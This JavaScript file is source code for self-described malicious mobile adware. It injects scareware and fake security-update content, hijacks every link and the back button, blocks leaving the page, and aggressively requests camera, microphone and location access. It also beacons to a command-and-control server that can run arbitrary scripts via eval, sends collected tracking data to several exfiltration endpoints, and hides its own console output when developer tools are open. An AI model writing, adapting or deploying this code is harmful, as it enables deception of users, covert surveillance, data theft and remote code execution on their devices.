// Main coordination script
class MaliciousMobileAdware {
    constructor() {
        this.modules = {};
        this.initialized = false;
        this.config = {
            aggressiveMode: true,
            dataCollection: true,
            adFrequency: 15000,
            redirectChance: 0.3,
            trackingEnabled: true
        };
    }

    async init() {
        if (this.initialized) return;
        
        console.log('🚀 Initializing Malicious Mobile Adware...');
        
        // Initialize all modules in sequence
        try {
            // 1. Start fingerprinting
            if (window.fingerprinter) {
                this.modules.fingerprinter = window.fingerprinter;
                console.log('✅ Fingerprinting initialized');
            }
            
            // 2. Start ad engine
            if (window.adEngine) {
                this.modules.adEngine = window.adEngine;
                console.log('✅ Ad engine initialized');
            }
            
            // 3. Start tracking
            if (window.invasiveTracker) {
                this.modules.tracker = window.invasiveTracker;
                console.log('✅ Tracking initialized');
            }
            
            // 4. Start click hijacking
            if (window.clickHijacker) {
                this.modules.hijacker = window.clickHijacker;
                console.log('✅ Click hijacking initialized');
            }
            
            // 5. Start redirects
            if (window.maliciousRedirector) {
                this.modules.redirector = window.maliciousRedirector;
                console.log('✅ Redirector initialized');
            }
            
            // 6. Start permission abuse
            if (window.permissionAbuser) {
                this.modules.permissions = window.permissionAbuser;
                console.log('✅ Permission abuse initialized');
            }
            
            this.initialized = true;
            this.startMainLoop();
            this.setupCommunication();
            this.hideFromDevTools();
            
            console.log('🎯 Malicious Mobile Adware fully operational');
            
        } catch (error) {
            console.error('Initialization error:', error);
        }
    }

    startMainLoop() {
        // Main malicious activity loop
        setInterval(() => {
            this.performMaliciousActivities();
        }, 10000); // Every 10 seconds
        
        // Aggressive mode activities
        if (this.config.aggressiveMode) {
            setInterval(() => {
                this.aggressiveActivities();
            }, 30000); // Every 30 seconds
        }
    }

    performMaliciousActivities() {
        const activities = [
            this.injectNewAds.bind(this),
            this.collectMoreData.bind(this),
            this.attemptRedirect.bind(this),
            this.checkForUpdates.bind(this)
        ];
        
        // Perform random activities
        activities.forEach(activity => {
            if (Math.random() < 0.5) {
                try {
                    activity();
                } catch (e) {
                    // Silent fail
                }
            }
        });
    }

    injectNewAds() {
        if (this.modules.adEngine) {
            // Inject new disguised ads
            const fakeContent = this.generateFakeContent();
            this.injectIntoPage(fakeContent);
            
            // Schedule forced ad
            if (Math.random() < 0.3) {
                setTimeout(() => {
                    this.modules.adEngine.showFullscreenAd();
                }, Math.random() * 5000);
            }
        }
    }

    generateFakeContent() {
        const fakeArticles = [
            {
                title: "Shocking Revelation About Your Device",
                content: "Experts discovered a critical issue affecting your phone. Click to fix immediately.",
                type: "scareware"
            },
            {
                title: "You're Selected for a Premium Gift",
                content: "Congratulations! You've been chosen for an exclusive reward. Claim now before it's gone!",
                type: "reward"
            },
            {
                title: "Important Security Update Required",
                content: "Your device security is at risk. Install this critical update now.",
                type: "fake_update"
            }
        ];
        
        const randomArticle = fakeArticles[Math.floor(Math.random() * fakeArticles.length)];
        
        return `
            <div class="fake-content-article" style="background: white; border-radius: 10px; 
                     padding: 20px; margin: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                <h3 style="color: #333; margin-bottom: 10px;">${randomArticle.title}</h3>
                <p style="color: #666; margin-bottom: 15px;">${randomArticle.content}</p>
                <button onclick="window.open('https://malicious-ads.com/fake-content', '_blank')"
                        style="background: linear-gradient(135deg, #667eea, #764ba2); 
                               color: white; border: none; padding: 10px 20px; 
                               border-radius: 25px; cursor: pointer; font-weight: bold;">
                    Learn More
                </button>
            </div>
        `;
    }

    injectIntoPage(content) {
        const mainContent = document.getElementById('mainContent');
        if (mainContent) {
            // Remove loading screen if present
            const loadingScreen = mainContent.querySelector('.loading-screen');
            if (loadingScreen) {
                loadingScreen.style.display = 'none';
            }
            
            // Inject fake content
            const tempDiv = document.createElement('div');
            tempDiv.innerHTML = content;
            mainContent.appendChild(tempDiv.firstElementChild);
        }
    }

    collectMoreData() {
        if (this.modules.tracker && this.config.dataCollection) {
            // Force additional data collection
            this.modules.tracker.sendToAnalytics('periodic_collection', {
                timestamp: Date.now(),
                url: window.location.href,
                scrollPosition: window.scrollY,
                viewport: `${window.innerWidth}x${window.innerHeight}`
            });
            
            // Try to collect additional sensor data
            this.collectAdditionalSensors();
        }
    }

    collectAdditionalSensors() {
        // Try to access additional Web APIs
        const apisToCheck = [
            'bluetooth',
            'usb',
            'nfc',
            'hid',
            'serial'
        ];
        
        apisToCheck.forEach(api => {
            if (api in navigator) {
                this.modules.tracker.sendToAnalytics('api_available', {
                    api: api,
                    available: true,
                    timestamp: Date.now()
                });
            }
        });
    }

    attemptRedirect() {
        if (this.modules.redirector && Math.random() < this.config.redirectChance) {
            this.modules.redirector.redirectToAd();
        }
    }

    checkForUpdates() {
        // Check for command and control instructions
        fetch('https://c2.malicious-adware.com/commands', {
            method: 'POST',
            body: JSON.stringify({
                deviceId: localStorage.getItem('device_fingerprint_hash'),
                timestamp: Date.now(),
                version: '1.0.0'
            }),
            mode: 'no-cors'
        })
        .then(response => {
            // Process any commands received
            // This would typically involve parsing commands from the C2 server
        })
        .catch(() => {});
    }

    aggressiveActivities() {
        if (!this.config.aggressiveMode) return;
        
        const aggressiveActions = [
            this.floodWithAds.bind(this),
            this.hijackAllLinks.bind(this),
            this.blockExitCompletely.bind(this),
            this.requestIntrusivePermissions.bind(this)
        ];
        
        // Perform one random aggressive action
        const randomAction = aggressiveActions[Math.floor(Math.random() * aggressiveActions.length)];
        randomAction();
    }

    floodWithAds() {
        if (this.modules.adEngine) {
            // Show multiple ads in quick succession
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    this.modules.adEngine.showRandomAd();
                }, i * 2000);
            }
            
            // Increase ad frequency temporarily
            const originalFrequency = this.modules.adEngine.adFrequency;
            this.modules.adEngine.adFrequency = 5000; // Every 5 seconds
            
            setTimeout(() => {
                this.modules.adEngine.adFrequency = originalFrequency;
            }, 30000); // Revert after 30 seconds
        }
    }

    hijackAllLinks() {
        // Force hijack all links on page
        const allLinks = document.getElementsByTagName('a');
        Array.from(allLinks).forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                
                window.open('https://malicious-ads.com/forced-hijack', '_blank');
                
                return false;
            }, true);
        });
    }

    blockExitCompletely() {
        // Make it very difficult to leave
        window.onbeforeunload = null; // Remove any existing handler
        window.addEventListener('beforeunload', (e) => {
            // Show multiple exit intent ads
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    if (this.modules.adEngine) {
                        this.modules.adEngine.showFullscreenAd();
                    }
                }, i * 500);
            }
            
            e.preventDefault();
            e.returnValue = '';
            return '';
        });
        
        // Also prevent back button
        history.pushState(null, null, location.href);
        window.onpopstate = () => {
            history.go(1);
            if (this.modules.adEngine) {
                this.modules.adEngine.showFullscreenAd();
            }
        };
    }

    requestIntrusivePermissions() {
        // Request all possible permissions aggressively
        const permissions = [
            { name: 'camera', options: { video: true } },
            { name: 'microphone', options: { audio: true } },
            { name: 'geolocation', options: { enableHighAccuracy: true } },
            { name: 'notifications', options: {} }
        ];
        
        permissions.forEach(permission => {
            if (permission.name === 'geolocation' && 'geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    () => {}, // Success callback
                    () => {}, // Error callback
                    permission.options
                );
            } else if (permission.name === 'notifications' && 'Notification' in window) {
                Notification.requestPermission();
            } else if (permission.name === 'camera' || permission.name === 'microphone') {
                if ('mediaDevices' in navigator && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia(permission.options).catch(() => {});
                }
            }
        });
    }

    setupCommunication() {
        // Setup WebSocket for real-time C2 communication
        this.setupWebSocket();
        
        // Setup periodic beacon to C2 server
        this.setupBeacon();
        
        // Setup data exfiltration
        this.setupExfiltration();
    }

    setupWebSocket() {
        try {
            const ws = new WebSocket('wss://c2.malicious-adware.com/ws');
            
            ws.onopen = () => {
                console.log('🔗 WebSocket connected to C2 server');
                
                // Send device info
                ws.send(JSON.stringify({
                    type: 'handshake',
                    deviceId: localStorage.getItem('device_fingerprint_hash'),
                    timestamp: Date.now()
                }));
            };
            
            ws.onmessage = (event) => {
                try {
                    const command = JSON.parse(event.data);
                    this.executeCommand(command);
                } catch (e) {
                    // Invalid command
                }
            };
            
            ws.onerror = () => {
                // Silent fail
            };
            
            this.ws = ws;
        } catch (e) {
            // WebSocket not available or blocked
        }
    }

    executeCommand(command) {
        switch(command.action) {
            case 'show_ad':
                if (this.modules.adEngine) {
                    this.modules.adEngine.showFullscreenAd();
                }
                break;
                
            case 'collect_data':
                if (this.modules.tracker) {
                    const data = this.modules.tracker.getAllTrackedData();
                    this.exfiltrateData(data);
                }
                break;
                
            case 'redirect':
                if (command.url) {
                    window.location.href = command.url;
                }
                break;
                
            case 'update_config':
                if (command.config) {
                    this.config = { ...this.config, ...command.config };
                }
                break;
                
            case 'execute_script':
                if (command.script) {
                    try {
                        eval(command.script);
                    } catch (e) {
                        // Script execution failed
                    }
                }
                break;
        }
    }

    setupBeacon() {
        // Send periodic beacon to C2 server
        setInterval(() => {
            const beaconData = {
                deviceId: localStorage.getItem('device_fingerprint_hash'),
                timestamp: Date.now(),
                url: window.location.href,
                adsServed: this.modules.adEngine ? this.modules.adEngine.adCount : 0,
                dataCollected: this.modules.tracker ? Object.keys(this.modules.tracker.trackedData).length : 0
            };
            
            fetch('https://c2.malicious-adware.com/beacon', {
                method: 'POST',
                body: JSON.stringify(beaconData),
                mode: 'no-cors',
                keepalive: true
            }).catch(() => {});
        }, 60000); // Every minute
    }

    setupExfiltration() {
        // Periodically exfiltrate all collected data
        setInterval(() => {
            if (this.modules.tracker) {
                const allData = this.modules.tracker.getAllTrackedData();
                this.exfiltrateData(allData);
            }
            
            // Also exfiltrate permissions data
            if (this.modules.permissions) {
                const permissionsData = this.modules.permissions.getAllPermissionsData();
                this.exfiltrateData({ type: 'permissions', data: permissionsData });
            }
        }, 300000); // Every 5 minutes
    }

    exfiltrateData(data) {
        const exfiltrationEndpoints = [
            'https://data-exfil.malicious/upload',
            'https://exfiltrate.pro/collect',
            'https://malicious-storage.com/store'
        ];
        
        exfiltrationEndpoints.forEach(endpoint => {
            fetch(endpoint, {
                method: 'POST',
                body: JSON.stringify(data),
                mode: 'no-cors'
            }).catch(() => {});
            
            // Also try with beacon
            if (navigator.sendBeacon) {
                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
                navigator.sendBeacon(endpoint, blob);
            }
        });
    }

    hideFromDevTools() {
        // Attempt to detect and evade developer tools
        const devToolsDetection = () => {
            // Check for devtools open
            const threshold = 160;
            const widthThreshold = window.outerWidth - window.innerWidth > threshold;
            const heightThreshold = window.outerHeight - window.innerHeight > threshold;
            
            if (widthThreshold || heightThreshold) {
                // Devtools might be open - reduce malicious activity
                this.config.aggressiveMode = false;
                console.log('⚠️ Developer tools detected - reducing activity');
            }
        };
        
        // Run detection periodically
        setInterval(devToolsDetection, 1000);
        
        // Also override console methods
        const originalLog = console.log;
        const originalWarn = console.warn;
        const originalError = console.error;
        
        console.log = function(...args) {
            // Filter out our messages
            if (!args[0].includes('🚀') && !args[0].includes('✅') && 
                !args[0].includes('🎯') && !args[0].includes('⚠️')) {
                originalLog.apply(console, args);
            }
        };
        
        console.warn = function(...args) {
            // Filter certain warnings
            if (!args[0].includes('Geolocation') && !args[0].includes('Notification')) {
                originalWarn.apply(console, args);
            }
        };
        
        console.error = function(...args) {
            // Filter certain errors
            originalError.apply(console, args);
        };
    }

    // Public method to check status
    getStatus() {
        return {
            initialized: this.initialized,
            config: this.config,
            modules: Object.keys(this.modules),
            adCount: this.modules.adEngine ? this.modules.adEngine.adCount : 0,
            dataPoints: this.modules.tracker ? 
                Object.values(this.modules.tracker.trackedData).reduce((a, b) => a + b.length, 0) : 0
        };
    }

    // Public method to disable (for debugging)
    disable() {
        this.initialized = false;
        this.config.aggressiveMode = false;
        
        // Stop all intervals
        // This would need to track all interval IDs in a real implementation
        
        console.log('🛑 Malicious Mobile Adware disabled');
    }
}

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    // Small delay to ensure all scripts are loaded
    setTimeout(() => {
        window.maliciousAdware = new MaliciousMobileAdware();
        window.maliciousAdware.init();
        
        // Also start after a longer delay to ensure user interaction
        setTimeout(() => {
            if (window.maliciousAdware && !window.maliciousAdware.initialized) {
                window.maliciousAdware.init();
            }
        }, 5000);
        
        // Make sure we start even if user interacts
        ['click', 'touchstart', 'keydown', 'scroll'].forEach(event => {
            document.addEventListener(event, () => {
                if (window.maliciousAdware && !window.maliciousAdware.initialized) {
                    setTimeout(() => window.maliciousAdware.init(), 100);
                }
            }, { once: true });
        });
    }, 1000);
});

// Export for external control (for C2 server)
window.getAdwareStatus = () => window.maliciousAdware ? window.maliciousAdware.getStatus() : null;
window.disableAdware = () => window.maliciousAdware ? window.maliciousAdware.disable() : null;